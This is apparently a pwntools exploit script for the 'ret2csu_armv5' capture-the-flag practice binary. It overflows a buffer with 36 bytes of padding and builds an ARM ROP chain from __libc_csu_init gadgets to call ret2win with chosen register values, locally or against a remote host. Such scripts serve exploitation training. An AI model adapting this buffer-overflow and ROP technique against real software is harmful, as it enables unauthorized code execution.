from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./ret2csu_armv5")


class ROPS:
    pop_r3  = 0x00010474  # pop {r3, pc}; 
    pop_all = 0x00010644  # pop {r4, r5, r6, r7, r8, sb, sl, pc};
    mov_all = 0x0001062c


"""
   1062c:	e1a02009 	mov	r2, r9
   10630:	e1a01008 	mov	r1, r8
   10634:	e1a00007 	mov	r0, r7
   10638:	e12fff33 	blx	r3
   1063c:	e1560004 	cmp	r6, r4
   10640:	1afffff7 	bne	10624 <__libc_csu_init+0x34>
   10644:	e8bd87f0 	pop	{r4, r5, r6, r7, r8, r9, sl, pc}
"""


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    elif args.GDB:
        return gdb.debug(elf.path)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(36)

    payload = [
        padding,
        ROPS.pop_r3,
        elf.plt.ret2win,
        ROPS.pop_all,
        0xDEADBEEF,  # r4
        0xDEADBEEF,  # r5
        0xDEADBEEF,  # r6
        0xDEADBEEF,  # r7
        0xCAFEBABE,  # r8
        0xD00DF00D,  # r9
        0xDEADBEEF,  # sl
        ROPS.mov_all,  # pc
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()